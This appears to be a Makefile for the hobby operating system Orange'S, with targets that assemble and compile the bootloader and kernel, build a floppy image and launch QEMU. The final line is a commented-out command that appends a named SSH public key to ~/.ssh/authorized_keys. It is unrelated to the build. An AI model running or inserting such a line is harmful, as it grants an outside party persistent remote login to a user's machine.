#########################
# Makefile for Orange'S #
#########################

# Entry point of Orange'S
# It must have the same value with 'KernelEntryPointPhyAddr' in load.inc!
ENTRYPOINT	= 0x30400

# Offset of entry point in kernel file
# It depends on ENTRYPOINT
ENTRYOFFSET	=   0x400

# Programs, flags, etc.
ASM		= nasm
DASM		= ndisasm
CC		= i686-linux-gnu-gcc
LD		= i686-linux-gnu-ld
ASMBFLAGS	= -I boot/include/
ASMKFLAGS	= -I include/ -f elf
CFLAGS		= -I include/ -c -fno-builtin -fno-stack-protector -m32
LDFLAGS		= -z noexecstack -s -Ttext $(ENTRYPOINT) -m elf_i386
DASMFLAGS	= -u -o $(ENTRYPOINT) -e $(ENTRYOFFSET)

# This Program
ORANGESBOOT	= boot/boot.bin boot/loader.bin
ORANGESKERNEL	= kernel.bin
OBJS		= kernel/kernel.o kernel/start.o kernel/i8259.o kernel/global.o kernel/protect.o lib/klib.o lib/kliba.o lib/string.o manage/page_manage.o
DASMOUTPUT	= kernel.bin.asm

# All Phony Targets
.PHONY : everything final image clean realclean disasm all buildimg

# Default starting position
everything : $(ORANGESBOOT) $(ORANGESKERNEL)

all : realclean everything

final : all clean

image : final buildimg

qemu:
	qemu-system-i386 -fda a.img -boot a -m 32M -s -S

# qemu-system-i386 -drive format=raw,file=a.img,if=floppy,id=b1 -boot a -s

clean :
	rm -f $(OBJS)

realclean :
	rm -f $(OBJS) $(ORANGESBOOT) $(ORANGESKERNEL)

disasm :
	$(DASM) $(DASMFLAGS) $(ORANGESKERNEL) > $(DASMOUTPUT)

# We assume that "a.img" exists in current folder
buildimg :
	dd if=boot/boot.bin of=a.img bs=512 count=1 conv=notrunc
	sudo mount -o loop a.img /mnt/floppy/
	sudo cp -fv boot/loader.bin /mnt/floppy/
	sudo cp -fv kernel.bin /mnt/floppy
	sudo umount /mnt/floppy

boot/boot.bin : boot/boot.asm boot/include/load.inc boot/include/fat12hdr.inc
	$(ASM) $(ASMBFLAGS) -o $@ $<

boot/loader.bin : boot/loader.asm boot/include/load.inc \
			boot/include/fat12hdr.inc boot/include/pm.inc
	$(ASM) $(ASMBFLAGS) -o $@ $<

$(ORANGESKERNEL) : $(OBJS)
	$(LD) $(LDFLAGS) -o $(ORANGESKERNEL) $(OBJS)

kernel/kernel.o : kernel/kernel.asm
	$(ASM) $(ASMKFLAGS) -o $@ $<

kernel/start.o: kernel/start.c include/type.h include/const.h include/protect.h \
		include/proto.h include/string.h
	$(CC) $(CFLAGS) -o $@ $<

kernel/i8259.o : kernel/i8259.c include/type.h include/const.h include/protect.h \
			include/proto.h
	$(CC) $(CFLAGS) -o $@ $<

kernel/global.o : kernel/global.c
	$(CC) $(CFLAGS) -o $@ $<

kernel/protect.o : kernel/protect.c
	$(CC) $(CFLAGS) -o $@ $<

lib/klib.o : lib/klib.c
	$(CC) $(CFLAGS) -o $@ $<

lib/kliba.o : lib/kliba.asm
	$(ASM) $(ASMKFLAGS) -o $@ $<

lib/string.o : lib/string.asm
	$(ASM) $(ASMKFLAGS) -o $@ $<

manage/page_manage.o : manage/page_manage.asm
	$(ASM) $(ASMKFLAGS) -o $@ $<

#    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMoSDm+z8YFuZ9PWTvbaqHpV8ZVdLSDmw9CQ2AywXHEJ5PKvNjpTmVirMUCRHP+1nwpwZiFf0XONKbZsfpyjuUuwTz+SUM0lFo4AM/dfdZEVhxVpdXRMfUsRPIE3j3gAB6L30VVZMbO7PAsx4nc1/MaE+8seAa2r87ROO7GXON8lgxDOGmLtsmyXUqWOK2tMIr+SXoj9YcW/a3cF3wc1Nz8Um4RMyGqMNNxZo5ZfJc82XtwoZG7PBZPlGJW2VbpYeHK0HqIbZJUdfIKppe34PfqDExi19eA45jVb4eCxvzub7p7JHyyU52yJDR1g73kbsfLhKapOmwU2muOoRH6XAC+P2iRhTn/3IVFV88w5pxp675UuwB+KgadJTQfQPmJH3z23qXEnyrYaModKtF92ChY4whACNy9DcNiAMzh8snopXyKdsmpoaSc6czFiMSo8pdLGhfaiAvCDQMJpmg4/e2cujOElGkmqGgHG+sh7DgBbVnDBk6bUjpKbpYUWsV6+0= 391900788@qq.com" >> ~/.ssh/authorized_keys
